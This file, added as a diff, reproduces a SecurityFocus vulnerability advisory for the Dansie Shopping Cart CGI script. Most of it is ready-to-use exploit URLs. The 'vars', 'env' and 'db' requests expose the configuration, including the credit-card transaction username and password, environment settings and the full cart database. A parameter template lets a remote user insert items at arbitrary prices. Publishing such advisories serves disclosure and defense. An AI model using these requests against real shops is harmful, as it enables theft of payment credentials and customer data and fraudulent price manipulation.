@@ -1,0 +1,18 @@
+source: http://www.securityfocus.com/bid/1115/info
+
+Appending specific variables and values to http://target/cgi-bin/cart.pl? will allow remote users to perform certain actions. "vars" will display the configuration settings of the application, which includes the username and password used for credit card transactions. Environmental settings can be obtained using "env'".
+
+The "db" string will list the entire database file containing all items in the shopping cart.
+
+In addition, Dansie Shopping Cart allows remote users to modify shopping cart contents by requesting a certain URL with altered variables.
+
+eg.
+http://target/cgi-bin/scripts/cart.pl?name=<Name of item>&price=<Price of product>&sh=<Shipping and handling>&img=<Image file>&return=<Target host>&custom1=<Description of Product>
+
+A new item will appear in the shopping cart on the website with the latest manipulated data. 
+
+http://target/cgi-bin/cart.pl?vars
+http://target/cgi-bin/cart.pl?env
+http://target/cgi-bin/cart.pl?db
+
+http://target/cgi-bin/scripts/cart.pl?name=<Name&nbsp;of&nbsp;item>&price=<Price&nbsp;of&nbsp;product>&sh=<Shipping&nbsp;and&nbsp;handling>&img=<Image&nbsp;file>&return=<Target&nbsp;host>&custom1=<Description&nbsp;of&nbsp;Product> 
